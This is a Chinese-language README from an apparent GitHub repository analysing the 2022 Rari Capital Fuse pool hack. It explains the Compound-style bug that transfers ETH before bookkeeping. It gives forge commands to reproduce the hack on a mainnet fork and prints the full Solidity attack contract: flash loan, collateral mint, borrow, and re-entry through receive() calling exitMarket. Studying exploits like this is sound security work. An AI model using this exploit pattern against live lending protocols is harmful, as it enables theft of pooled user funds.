# Rari_Fei_Vul_Poc
Rari Capital 攻击事件的 分析和复现 

### 写在前面的废话

4月30日, `Rari Capital`的几个借贷池遭受闪电贷重入攻击, 约受损8000万美金.

漏洞原理与去年我分析过的`Cream 第四次被黑`类似, 但攻击方式更加优雅, 故有此文.

### 漏洞起因: Compound起的坏头

老牌Defi借贷项目`Compound`在代码实现上存在兼容性问题, 没有遵循`check-effect-interaction`原则, 简单用人话翻译就是, 针对借贷场景,没有做到`先记账, 再转账` 

```
https://github.com/compound-finance/compound-protocol/blob/ae4388e780a8d596d97619d9704a931a2752c2bc/contracts/CToken.sol#L786
```

![image](https://user-images.githubusercontent.com/33406415/168264773-32e9f54d-6e8e-434c-90b9-a7c575814a7d.png)



在大部分情况下, 这个逻辑没问题, 但是如果用户借贷的资产为带类似钩子函数的`Token`,就会引发重入的风险, 攻击者可以在记账之前进行预期之外的恶意操作, 对项目造成大量损失.

当然在`Compound`开发之初, 可能还没有`check-effect-interaction`这个说法, 所以我们不能责备他们太多, 而且他们自己非常清楚代码的缺陷, 所以在运营上一直避免引入不兼容的加密资产.

然而仿盘们心里并没有这个哔数.

以去年的`Cream`为例:

![image](https://user-images.githubusercontent.com/33406415/168264788-edd9600e-7692-4db1-aada-5aafa67c0a66.png)


其实去年在分析`Cream`的时候, 我以为只会是孤例, 因为漏洞诞生于2个项目的错误拼接, 触发条件苛刻, 而且`Cream`上亿美金的损失会给开发者一个长足的教训.

然而现实远非我的预料, 3月的`Hundred Finance`, `VOLTAGE FINANCE`. 
不到一年时间, 仿盘们以各种姿势, 前赴后继踏入同一条河流.


### 新的漏洞触发姿势

`Rari`虽然吸取了前人的教训,没有引入不兼容的Token, 但是自己作死, 在`CEther`合约中使用了`call.value`来进行`ETH`的转账.
首次在不借助合作伙伴的情况下, 自主独立创造了漏洞环境.

```
https://etherscan.io/address/0xd77e28a1b9a9cfe1fc2eee70e391c05d25853cbf#code
```

![image](https://user-images.githubusercontent.com/33406415/168264813-bc11e823-fe35-4de4-b9bd-b453e8ae65a1.png)


### 更优雅的攻击方式

以往仿盘们的攻击者, 虽然通过重入借贷了2次,但只能选择把原始质押资产留在池子里.
所以单次攻击最大获利为 70% + 70% - 100% = 40%


而这次攻击者虽然只有一次借贷, 但是自己原始的质押资产全身而退, 约等于白嫖了属于是.

![image](https://user-images.githubusercontent.com/33406415/168264843-d036f4d6-b8d1-4b47-8ffb-03afad810d01.png)


### 重入锁的局限性

`nonreentrant`可以有效的抵御单一合约在单一transaction中的重入风险.
但是对于由多合约构造的复杂应用, 重入锁并不能起到足够的作用.
A合约的a函数和B合约的b函数即使都加了重入锁，攻击者依然可以通过A合约的a函数去重入B合约的b函数. 


### 仿盘的自我修养

近一年的时间里, 仿盘们或浑然不知, 或修修补补, 有的项目方给几乎所有核心函数增加`nonReentrant`防重入锁, 以为万事大吉.
但是依然没有遵循`check-effect-interaction`原则, 治标不治本, 其实改一下代码顺序就可以....

例如记吃记打的`Cream`在后续更新版本中, 就更改了转账和记账的顺序

```
https://etherscan.io/address/0x28192abdb1d6079767ab3730051c7f9ded06fe46#code
```

![image](https://user-images.githubusercontent.com/33406415/168264863-e01bfa2d-a96b-4c13-9bdd-741f59802444.png)





### 复现方法

```
git clone https://github.com/W2Ning/Rari_Fei_Vul_Poc.git && cd Rari_Fei_Vul_Poc
```


```
forge test -vvv --fork-url $eth --fork-block-number 14684813
```


<img width="600" alt="image" src="https://user-images.githubusercontent.com/33406415/168168303-d6fadeb3-c983-46f1-bb58-61e31c554eab.png">


### 核心攻击代码

```js
    function test() public{

        // 前置准备操作1: 查看 fETH_127 中有多少ETH可以借  
        emit log_named_uint("ETH Balance of fETH_127 before borrowing",address(fETH_127).balance/1e18);

        // 前置准备操作2: 因为forge的测试地址上本身有很多的ETH 
        // 所以先把他们都转走, 方便查看攻击所得ETH数量
        payable(address(0)).transfer(address(this).balance);

        emit log_named_uint("ETH Balance after sending to blackHole",address(this).balance);

        // 第一步, 从balancer中通过闪电贷借1500万的USDC
        // 攻击者其实借了1.5亿, 但其实1500万就可以
        // 但是balancer的闪电贷是不收手续费的, 所以借多少都无所谓

        address[] memory tokens = new address[](1);

        tokens[0] = address(usdc);

        uint[] memory amounts = new uint[](1);

        amounts[0] =  150000000*10**6;

        vault.flashLoan(address(this), tokens, amounts, '');

    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
    {
        // 没有下面四行会有恶心的warning
        tokens;
        amounts;
        feeAmounts;
        userData;
        // 查看是否成功借到了1500万的USDC

        uint usdc_balance = usdc.balanceOf(address(this));
        emit log_named_uint("Borrow USDC from balancer",usdc_balance);

        // 第二步, 调用fusdc_127的mint函数, 
        // 完成usdc的质押操作

        usdc.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.accrueInterest();

        fusdc_127.mint(15000000000000);

        uint fETH_Balance = fETH_127.balanceOf(address(this));

        emit log_named_uint("fETH Balance after minting",fETH_Balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after minting",usdc_balance);

        // 第三步, 调用 Unitroller 的 enterMarkets函数

        address[] memory ctokens = new address[](1);

        ctokens[0] =  address(fusdc_127);

        rari_Comptroller.enterMarkets(ctokens);

        // 第四步, fETH_127 的borrow函数, 借1977个ETH

        fETH_127.borrow(1977 ether);

        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing",address(fETH_127).balance/1e18);

        emit log_named_uint("ETH Balance of me after borrowing",address(this).balance/1e18);

        usdc_balance = usdc.balanceOf(address(this));

        fusdc_127.approve(address(fusdc_127), type(uint256).max);

        fusdc_127.redeemUnderlying(15000000000000);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after borrowing",usdc_balance);

        // 第五步, 把1500万的USDC还给balancer

        usdc.transfer(address(vault), usdc_balance);

        usdc_balance = usdc.balanceOf(address(this));

        emit log_named_uint("USDC balance after repayying",usdc_balance);
    }


    receive() external payable {

        rari_Comptroller.exitMarket(address(fusdc_127));

    }

```
